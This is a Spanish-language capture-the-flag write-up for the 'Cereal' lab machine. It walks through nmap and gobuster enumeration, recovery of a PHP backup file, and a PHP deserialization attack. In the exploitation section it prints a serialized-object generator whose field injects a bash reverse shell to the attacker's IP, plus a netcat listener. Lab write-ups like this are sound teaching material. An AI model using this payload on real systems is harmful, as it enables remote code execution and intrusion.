

## Reconocimiento

Empezando con el típico escaneo de `Nmap` y exportamos todo el output a un archivo llamado **allports**
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128
```
```bash
# Nmap 7.93 scan initiated Wed Jul 26 16:21:16 2023 as: nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.177.128
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.177.128 ()        Status: Up
Host: 192.168.177.128 ()        Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 11111/open/tcp//vce///, 22222/open/tcp//easyengine///, 22223/open/tcp//unknown///, 33333/open/tcp//dgi-serv///, 33334/open/tcp//speedtrace///, 44441/open/tcp/////, 44444/open/tcp//cognex-dataman///, 55551/open/tcp/////, 55555/open/tcp//unknown///     Ignored State: closed (65520)
# Nmap done at Wed Jul 26 16:21:18 2023 -- 1 IP address (1 host up) scanned in 1.94 seconds
```
Posteriormente mandamos unos scripts de reconocimiento a los puertos abiertos, esto también lo exportaremos en un archivo llamado targeted
```bash
nmap -sC -sV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.177.128 -oN targeted
```
```bash
# Nmap 7.93 scan initiated Wed Jul 26 16:25:43 2023 as: nmap -sC -sV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 -oN targeted 192.168.177.128
Nmap scan report for 192.168.177.128
Host is up (0.00076s latency).

PORT      STATE SERVICE         VERSION
21/tcp    open  ftp             vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.177.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Apr 12  2021 pub
22/tcp    open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 00242bae41baac52d15d4fad00ce3967 (RSA)
|   256 1ae3c737522edcdd62610327551a866f (ECDSA)
|_  256 24fde78089c557fdf3e5c92f01e16b30 (ED25519)
80/tcp    open  http            Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by: Rocky Linux
|_http-server-header: Apache/2.4.37 ()
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL, RTSPRequest: 
|_    Host '192.168.177.1' is not allowed to connect to this MariaDB server
11111/tcp open  vce?
22222/tcp open  easyengine?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
22223/tcp open  unknown
33333/tcp open  dgi-serv?
33334/tcp open  speedtrace?
44441/tcp open  http            Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 ()
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
44444/tcp open  cognex-dataman?
55551/tcp open  unknown
55555/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=7/26%Time=64C14908%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.177\.1'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPReques
SF:t,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.177\.1'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 26 16:30:42 2023 -- 1 IP address (1 host up) scanned in 298.71 seconds
```

Ahora vamos a centrarnos en el puerto 80 que tiene un servidor `Apache` corriendo por detrás, y con `Gobuster` vamos a hacer un reconocimiento de directorios

```bash
gobuster dir -u http://192.168.177.128/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.177.128/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/07/26 16:42:22 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 236] [--> http://192.168.177.128/blog/]
/admin                (Status: 301) [Size: 237] [--> http://192.168.177.128/admin/]
                                                                                   
===============================================================
2023/07/26 16:42:52 Finished
===============================================================
```

Dentro de el directorio blog podemos usar Wappalyzer para ver que es un `WordPress` lo que esta corriendo por detrás

Como vemos mal el contenido podemos hacer un view-source de la pagina y ver que esta intentando sacar los recursos de un http://cereal.ctf que nuestra maquina no puede acceder

Para solucionar esto nos vamos al /etc/hosts y añadirle esto (la ip es la de la maquina Cereal ):

```bash
192.168.177.128 cereal.ctf
```

Ahora podemos aplicar un reconocimiento de subdominios en el puerto 44441 que también esta corriendo `Apache` (si lo haces en el puerto 80 no te aparecerá ningún subdominio) 

*Es importante enumerar los dominios y subdominios de todos los puertos que tengan un servicion web corriendo por detras*

```bash
gobuster vhost -u http://192.168.177.128/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://cereal.ctf:44441
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/07/26 19:02:37 Starting gobuster in VHOST enumeration mode
===============================================================
Found: secure.cereal.ctf:44441 (Status: 200) [Size: 1538]
                                                         
===============================================================
2023/07/26 19:02:40 Finished
===============================================================
```

Vemos que hay un subdominio mas, así que lo añadimos al /etc/hosts de la misma manera que antes

En este subdominio es donde vamos a hacer la explotación

## Explotación

Con `Tcpdump` podemos ponernos en escucha para captar todas las trazas icmp

```bash
sudo tcpdump -i vmnet1 icmp -n
```

Y en el panel de ping ponemos nuestra ip, para ver si nos manda trazas 

![1](</Writeups/Maquinas/CEREAL/img/1.png>)

Podemos probar a inyectar varios comandos, pero esta bien sanitizado así que no podremos inyectar nada

![1](</Writeups/Maquinas/CEREAL/img/2.png>)

Viendo que no somos capaces de hacer nada en este panel, podemos usar `Burpsuite` pera interceptar la petición que mandamos al hacer un ping

![1](</Writeups/Maquinas/CEREAL/img/3.png>)

Aquí podremos ver como esta enviando un objeto a demás de la ip, si seleccionamos todo esto y hacemos un Cntrl + Shift + u para descodificarlo (esta en urlencode)

Podremos ver mas a detalle que tiene este objeto:
- El objeto tiene 8 caracteres (0:8) que son "pingTest"
- Tiene una string de nueve caracteres (s:9) que es "ipAddress"

![1](</Writeups/Maquinas/CEREAL/img/4.png>)

Sabiendo esto podemos intuir que están trabajando con una serializacion de objetos, así que podemos intentar un `Deserialization Attack`

Ahora tenemos que intentar encontrar algún archivo que nos de mas información de como se efectúa la deserializacion, para ello usaremos `Gobuster` otra vez pero esta vez en el puerto 44441 y con un diccionario mas grande

```bash
gobuster dir -u http://secure.cereal.ctf:44441 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://secure.cereal.ctf:44441
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/07/26 19:51:18 Starting gobuster in directory enumeration mode
===============================================================
/php                  (Status: 200) [Size: 3699]
/style                (Status: 200) [Size: 3118]
/index                (Status: 200) [Size: 1538]
/back_en              (Status: 301) [Size: 247] [--> http://secure.cereal.ctf:44441/back_en/]
                                                                                             
===============================================================
2023/07/26 19:57:09 Finished
===============================================================
```

Una vez encontrado el /back_en podemos listar archivos dentro de este directorio, (ya que no tenemos permiso para entrar a este directorio) e iremos probando distintas extensiones, al final la extension php.bak nos dará un archivo

```bash
gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.bak
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://secure.cereal.ctf:44441/back_en
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php.bak
[+] Timeout:                 10s
===============================================================
2023/07/26 20:02:49 Starting gobuster in directory enumeration mode
===============================================================
/index.php.bak        (Status: 200) [Size: 1814]
Progress: 14180 / 441122 (3.21%)               ^C
[!] Keyboard interrupt detected, terminating.
                                                
===============================================================
2023/07/26 20:02:52 Finished
===============================================================
```

Ahora podemos meternos dentro del código fuente del archivo index.php.bak y ver como funciona internamente la serializacion y deserializacion en este servidor:

```php
class pingTest {

	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
	
	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();
	}
	
	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }
        
}
if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}

$pingTest->validate();
```

Podemos ver que el código de `PHP` aplica una validación en la ip, para asegurarse que es realmente una ip, para posteriormente poner la variable isValid en True, para ser capaces de saltarnos la validación tendríamos que hacer que el objeto que enviemos ponga esta variable en True.

Para esto nos podemos crear un archivo en `PHP` en nuestra maquina que nos cree el objeto según estos parámetros.

Aquí vamos a poner el valor isValid en true y en la ipAdress ponemos un punto y coma y el one-liner típico de una reverse shell 

```php
<?php

class pingTest {
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.177.1/443 0>&1'";
	public $isValid = True;
	public $output = "";
}

echo urlencode(serialize(new pingtest));
```

Si ejecutamos este script nos dará el objeto URLencodeado 

```bash
php serialize.php 2>/dev/null; echo
```

Ahora en burpsuite sustituimos el anterior objeto por este

![1](</Writeups/Maquinas/CEREAL/img/5.png>)

Nos ponemos e escucha por el puerto 443 

```bash
nc -nlvp 443
```

Y enviamos la petición, esto nos dará una consola interactiva 